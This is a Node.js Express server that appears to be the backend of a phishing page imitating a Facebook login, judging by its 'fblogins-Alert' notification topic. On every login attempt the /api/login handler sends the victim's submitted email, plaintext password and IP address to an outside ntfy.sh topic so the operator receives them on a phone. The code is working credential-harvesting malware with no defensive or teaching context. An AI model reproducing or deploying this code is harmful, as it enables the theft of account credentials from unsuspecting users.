const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ntfy topic - REPLACE with your actual topic name from the app
const NTFY_TOPIC = 'fblogins-Alert';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const users = [];

// Send to ntfy
async function sendToNtfy(email, password, ip) {
    const message = `🔐 LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n⏰ Time: ${new Date().toString()}`;
    
    try {
        await axios.post(`https://ntfy.sh/${NTFY_TOPIC}`, message, {
            headers: {
                'Title': '🔐 New Login',
                'Priority': 'high',
                'Tags': 'warning,lock'
            }
        });
        console.log('✅ ntfy notification sent');
    } catch (error) {
        console.log('❌ ntfy error:', error.message);
    }
}

// Register
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    const newUser = { id: users.length + 1, name, email, password };
    users.push(newUser);
    
    res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
});

// Login - Sends ntfy notification
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Send notification to your phone (instant)
    sendToNtfy(identifier, password, ip);
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    const user = users.find(u => u.email === identifier);
    
    if (!user || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    res.json({ success: true, message: 'Login successful!', user: { id: user.id, name: user.name, email: user.email } });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', ntfy_topic: NTFY_TOPIC });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`ntfy topic: ${NTFY_TOPIC}`);
});
